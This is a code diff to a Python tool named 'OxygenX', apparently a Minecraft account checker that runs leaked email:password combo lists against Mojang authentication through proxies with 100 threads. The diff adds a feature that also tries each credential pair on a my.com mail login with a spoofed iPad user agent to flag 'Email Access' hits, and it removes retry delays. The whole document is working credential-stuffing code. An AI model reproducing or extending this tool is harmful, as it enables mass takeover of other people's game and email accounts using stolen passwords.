@@ -24,10 +24,13 @@ while True:
   retries: 2
 
   # Higher for better accuracy but slower (counted in milliseconds)
-  timeout: 10000
+  timeout: 15000
 
   # Threads for account checking
   threads: 100
+
+  # Check hits if its a mail access
+  mail_access: true
 
   # Save bad accounts, good for checking paid alts (will use more cpu and take longer)
   save_bad: false
@@ -40,7 +43,7 @@ while True:
     liquidbounce: true
     optifine: true
     labymod:  true
-    # minecon capes
+    # Minecon/Mojang cape
     minecon:  true
 
   rank:
@@ -90,17 +93,19 @@ class Counter:
     hypixelrank = 0
     hypixelhl = 0
     hivelevel = 0
+    emailaccess = 0
 
 
 class Main:
     def __init__(self):
-        windll.kernel32.SetConsoleTitleW('OxygenX-beta | by ShadowOxygen')
+        windll.kernel32.SetConsoleTitleW('OxygenX-0.2 | by ShadowOxygen')
         self.printing = Queue()
         self.caputer = Queue()
         self.hits = Queue()
         self.bad = Queue()
         self.towrite = Queue()
         self.accounts = []
+        self.maheaders = {'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0', 'Pragma': 'no-cache'}
         self.hyr = compile(r'\n<span class=\"rank-badge rank-badge-.*\">(.*)</span>')
         self.hyl = compile(r"Player's Network Level\".*>(.*)<")
         self.rankhv = compile(r'class=\"rank.*\">(.*)<')
@@ -171,7 +176,6 @@ class Main:
         if self.savebad:
             Thread(target=self.save_bad).start()
         pool = ThreadPool(Checker.threads)
-        sleep(4)
         system('cls')
         t2.start()
         print(Fore.LIGHTCYAN_EX + self.t + Fore.WHITE)
@@ -187,14 +191,15 @@ class Main:
                       f'Demo: {Counter.demo}\n'
                       f'Secured: {Counter.nfa}\n'
                       f'Unsecured: {Counter.sfa}\n'
+                      f'Email Access: {Counter.emailaccess}\n'
                       f'Unmigrated: {Counter.unfa}\n'
-                      f'Mojang cape: {Counter.mojang}\n'
+                      f'Mojang/Minecon cape: {Counter.mojang}\n'
                       f'Optifine cape: {Counter.optifine}\n'
                       f'Labymod cape: {Counter.labymod}\n'
                       f'LiquidBounce cape: {Counter.liquidbounce}\n'
-                      f'HypixelRanked accounts: {Counter.hypixelrank}\n'
-                      f'MineplexRanked accounts: {Counter.mineplexrank}\n'
-                      f'HiveMCRanked accounts: {Counter.hivemcrank}\n'
+                      f'Hypixel Ranked accounts: {Counter.hypixelrank}\n'
+                      f'Mineplex Ranked accounts: {Counter.mineplexrank}\n'
+                      f'HiveMC Ranked accounts: {Counter.hivemcrank}\n'
                       f'Hypixel {self.hypminl}+ accounts: {Counter.hypixelhl}\n'
                       f'Mineplex {self.mpminl}+ accounts: {Counter.mineplexhl}\n'
                       f'{Fore.LIGHTMAGENTA_EX}\nFinished\n{Fore.LIGHTRED_EX}')
@@ -235,7 +240,6 @@ class Main:
                 token = answer['accessToken']
                 sfa = True
                 securec = 'False'
-                Counter.hits += 1
                 data = '======================================\n' \
                     f'{line}\n' \
                     f'Username: {username}\n' \
@@ -263,7 +267,7 @@ class Main:
                     Counter.nfa += 1
                     self.printing.put(Fore.LIGHTGREEN_EX + f'[Secured] {line} User: {username}' + Fore.WHITE)
                     self.towrite.put([line, 'Secured'])
-
+                Counter.hits += 1
                 if self.name(username):
                     Counter.special_name += 1
                     self.towrite.put([f'{line} | Username: {username}', 'SpecialName'])
@@ -324,6 +328,11 @@ class Main:
                         Counter.liquidbounce += 1
                         self.towrite.put([f'{line} | Username: {username}', 'LiquidBounceCape'])
                         data += '\nLiquidBounceCape: True'
+                if Checker.emailaccess and sfa:
+                    if self.mailaccess(email, password):
+                        Counter.emailaccess += 1
+                        self.towrite.put([line, 'EmailAccess'])
+                        data += '\nEmail Access: True'
                 self.caputer.put(data)
         except Exception as e:
             if self.debug:
@@ -355,7 +364,6 @@ class Main:
                                       headers=headerz, timeout=Checker.timeout / 1000).json()
                         break
                     except:
-                        sleep(2)
                         continue
             answered = answer
         except Exception as e:
@@ -370,10 +378,9 @@ class Main:
                 hds = {"Authorization": f"Bearer {token}"}
                 try:
                     lol = get('https://api.mojang.com/user/security/challenges',
-                              headers=hds, proxies=self.proxies(), timeout=10).text
+                              headers=hds, proxies=self.proxies(), timeout=8).text
                     break
                 except:
-                    sleep(2)
                     continue
             answer = lol
         except Exception as e:
@@ -391,6 +398,7 @@ class Main:
                 f' | Secured: {str(Counter.nfa)}'
                 f' | Unsecured: {str(Counter.sfa)}'
                 f' | Demo: {str(Counter.demo)}'
+                f' | Mail Access: {str(Counter.emailaccess)}'
                 f' | Unmigrated: {str(Counter.unfa)}'
                 f" | Left: {str(len(self.combolist) - (Counter.hits + Counter.bad + Counter.demo))}")
             sleep(0.01)
@@ -550,11 +558,21 @@ class Main:
                 self.printing.put(f'{Fore.LIGHTRED_EX}Error Hypixel:\n{ed}{Fore.WHITE}')
             return both
 
+    def mailaccess(self, email, password):
+        test = get(
+            f'https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOSÂ¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login={email}&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password={password}&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&',
+            headers=self.maheaders).text
+        if 'Ok=1' in test:
+            return True
+        else:
+            return False
+
 
 class Checker:
     retries = int(config['checker']['retries'])
     timeout = int(config['checker']['timeout'])
     threads = int(config['checker']['threads'])
+    emailaccess = bool(config['checker']['mail_access'])
     save_bad = bool(config['checker']['save_bad'])
     debug = bool(config['checker']['debugging'])
 
